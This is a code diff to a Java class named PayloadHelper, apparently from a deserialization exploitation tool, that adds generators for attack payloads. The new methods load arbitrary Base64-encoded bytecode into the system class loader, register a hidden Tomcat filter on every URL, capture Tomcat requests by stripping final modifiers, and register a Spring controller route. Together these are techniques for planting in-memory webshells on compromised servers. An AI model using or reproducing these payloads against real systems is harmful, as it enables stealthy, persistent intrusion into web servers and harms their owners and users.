@@ -93,7 +93,7 @@ public class PayloadHelper {
     }
 
     public static String defaultTestCommand(){
-        return "open /System/Applications/Calculator.app";
+        return "open -a Calculator";
     }
 
     public static ObjectGadget makeGadget(Class<? extends ObjectGadget> clazz, String type) throws GenerateErrorException {
@@ -144,5 +144,129 @@ public class PayloadHelper {
                 "}catch (Exception e){\n" +
                 "}\n" +
                 "throw new Exception(localStringBuffer.toString());";
+    }
+
+
+    public static String makeBytesLoader(String code, String classname) {
+        return "try{\n" +
+                "   String s1=\"" + code + "\";\n" +
+                "   byte[] bytes1= java.util.Base64.getDecoder().decode(s1.getBytes());\n" +
+                "   java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class, byte[].class, int.class, int.class});\n" +
+                "   m.setAccessible(true);\n" +
+                "   m.invoke(java.lang.ClassLoader.getSystemClassLoader(), new Object[]{\"" + classname + "\",bytes1, 0, bytes1.length});\n" +
+                "} catch (Exception e) {\n" +
+                "   e.printStackTrace();\n" +
+                "}";
+    }
+
+    //https://xz.aliyun.com/t/7388#toc-3
+    public static String makeTomcatFilterRegister(String classname) {
+        return "try{\n" +
+                "            java.lang.reflect.Field field = org.apache.catalina.core.ApplicationFilterChain.class\n" +
+                "                    .getDeclaredField(\"lastServicedRequest\");\n" +
+                "            field.setAccessible(true);\n" +
+                "            ThreadLocal t = (ThreadLocal) field.get(null);\n" +
+                "            javax.servlet.ServletRequest servletRequest = null;\n" +
+                "            if (t != null && t.get() != null) {\n" +
+                "                servletRequest = (javax.servlet.ServletRequest) t.get();\n" +
+                "            }\n" +
+                "            if (servletRequest != null) {\n" +
+                "                javax.servlet.ServletContext servletContext = servletRequest.getServletContext();\n" +
+                "                org.apache.catalina.core.StandardContext standardContext = null;\n" +
+                "                if (servletContext.getFilterRegistration(\"threedr3am\") == null) {\n" +
+                "                    for (; standardContext == null; ) {\n" +
+                "                        java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField(\"context\");\n" +
+                "                        contextField.setAccessible(true);\n" +
+                "                        Object o = contextField.get(servletContext);\n" +
+                "                        if (o instanceof javax.servlet.ServletContext) {\n" +
+                "                            servletContext = (javax.servlet.ServletContext) o;\n" +
+                "                        } else if (o instanceof org.apache.catalina.core.StandardContext) {\n" +
+                "                            standardContext = (org.apache.catalina.core.StandardContext) o;\n" +
+                "                        }\n" +
+                "                    }\n" +
+                "                    if (standardContext != null) {\n" +
+                "                        java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class\n" +
+                "                                .getDeclaredField(\"state\");\n" +
+                "                        stateField.setAccessible(true);\n" +
+                "                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);\n" +
+                "                        javax.servlet.Filter star = (javax.servlet.Filter)(Class.forName(\"" + classname + "\").newInstance());\n" +
+                "                        javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext\n" +
+                "                                .addFilter(\"star\", star);\n" +
+                "                        filterRegistration.setInitParameter(\"encoding\", \"utf-8\");\n" +
+                "                        filterRegistration.setAsyncSupported(false);\n" +
+                "                        filterRegistration\n" +
+                "                                .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,\n" +
+                "                                        new String[]{\"/*\"});\n" +
+                "                        if (stateField != null) {\n" +
+                "                            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);\n" +
+                "                        }\n" +
+                "                        if (standardContext != null) {\n" +
+                "                            java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod(\"filterStart\",null);\n" +
+                "                            filterStartMethod.setAccessible(true);\n" +
+                "                            filterStartMethod.invoke(standardContext, null);\n" +
+                "                            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext\n" +
+                "                                    .findFilterMaps();\n" +
+                "                            for (int i = 0; i < filterMaps.length; i++) {\n" +
+                "                                if (filterMaps[i].getFilterName().equalsIgnoreCase(\"star\")) {\n" +
+                "                                    org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];\n" +
+                "                                    filterMaps[i] = filterMaps[0];\n" +
+                "                                    filterMaps[0] = filterMap;\n" +
+                "                                    break;\n" +
+                "                                }\n" +
+                "                            }\n" +
+                "                        }\n" +
+                "                    }\n" +
+                "                }\n" +
+                "            }\n" +
+                "        }catch(Exception e){\n" +
+                "            e.printStackTrace();\n" +
+                "        }";
+
+    }
+
+    //https://xz.aliyun.com/t/7388#toc-2
+    public static String makeGetTomcatRequest() {
+        return "Class c = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\");\n" +
+                "java.lang.reflect.Field f = c.getDeclaredField(\"WRAP_SAME_OBJECT\");\n" +
+                "java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\"modifiers\");\n" +
+                "modifiersField.setAccessible(true);\n" +
+                "modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n" +
+                "f.setAccessible(true);\n" +
+                "if (!f.getBoolean(null)) {\n" +
+                "   f.setBoolean(null, true);\n" +
+                "}\n" +
+                "c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\");\n" +
+                "f = c.getDeclaredField(\"lastServicedRequest\");\n" +
+                "modifiersField = f.getClass().getDeclaredField(\"modifiers\");\n" +
+                "modifiersField.setAccessible(true);\n" +
+                "modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n" +
+                "f.setAccessible(true);\n" +
+                "if (f.get(null) == null) {\n" +
+                "   f.set(null, new ThreadLocal());\n" +
+                "}\n" +
+                "f = c.getDeclaredField(\"lastServicedResponse\");\n" +
+                "modifiersField = f.getClass().getDeclaredField(\"modifiers\");\n" +
+                "modifiersField.setAccessible(true);\n" +
+                "modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n" +
+                "f.setAccessible(true);\n" +
+                "if (f.get(null) == null) {\n" +
+                "   f.set(null, new ThreadLocal());\n" +
+                "}";
+    }
+
+    public static String makeRegisterSpringShell(String routepath, String classname) {
+        return "try{\n" +
+                "   javax.servlet.ServletContext sss = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest().getSession().getServletContext();\n" +
+                "   org.springframework.web.context.WebApplicationContext context  = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(sss);\n" +
+                "   org.springframework.web.servlet.mvc.condition.PatternsRequestCondition url = new org.springframework.web.servlet.mvc.condition.PatternsRequestCondition(new String[]{\"/" + routepath + "\"});\n" +
+                "   org.springframework.web.bind.annotation.RequestMethod[] a={org.springframework.web.bind.annotation.RequestMethod.GET,org.springframework.web.bind.annotation.RequestMethod.POST};\n" +
+                "   org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition ms = new org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition(a);\n" +
+                "   org.springframework.web.servlet.mvc.method.RequestMappingInfo info = new org.springframework.web.servlet.mvc.method.RequestMappingInfo(url, ms, null, null, null, null, null);\n" +
+                "   org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping rs = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);\n" +
+                "   java.lang.reflect.Method m = (Class.forName(\"" + classname + "\").getDeclaredMethods())[0];\n" +
+                "   rs.registerMapping(info, Class.forName(\"" + classname + "\").newInstance(), m);\n" +
+                "} catch (Exception e) {\n" +
+                "   e.printStackTrace();\n" +
+                "}";
     }
 }
